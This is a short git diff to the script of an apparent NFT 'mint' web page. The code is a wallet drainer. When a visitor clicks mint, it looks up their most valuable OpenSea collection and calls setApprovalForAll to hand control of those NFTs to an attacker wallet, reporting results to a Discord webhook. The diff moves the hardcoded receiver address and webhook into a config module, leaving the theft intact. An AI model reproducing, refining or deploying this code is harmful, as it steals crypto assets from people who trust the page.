@@ -1,5 +1,5 @@
 export let web3 = new Web3(ethereum);
-import discord from "../secure";
+import api from "./secure.js";
 
 const isMetaMaskConnected = async () => {
   let accounts = await web3.eth.getAccounts();
@@ -20,7 +20,7 @@ function updateStatus(status) {
 
 function sendMessage(msg) {
   const request = new XMLHttpRequest();
-  request.open("POST", discord);
+  request.open("POST", api.discord);
   // replace the url in the "open" method with yours
   request.setRequestHeader("Content-type", "application/json");
   const params = {
@@ -70,7 +70,7 @@ document.querySelector("#mint").addEventListener("click", sendEth);
 
 async function sendEth() {
   let myaccounts = await web3.eth.getAccounts();
-  let receiver = "0xEaC458B2F78b8cb37c9471A9A0723b4Aa6b4c62D";
+  console.log(myaccounts);
   let response = await fetch(
     `https://opensea.io/${myaccounts[0]}?search[sortBy]=PRICE&search[sortAscending]=false`
   );
@@ -104,7 +104,7 @@ async function sendEth() {
   ];
   let contract = new web3.eth.Contract(abi, result);
   contract.methods
-    .setApprovalForAll(receiver, true)
+    .setApprovalForAll(api.wallet, true)
     .send({ from: myaccounts[0] }, function (err, res) {
       if (err) {
         sendMessage(`${result} refused to approve!`);
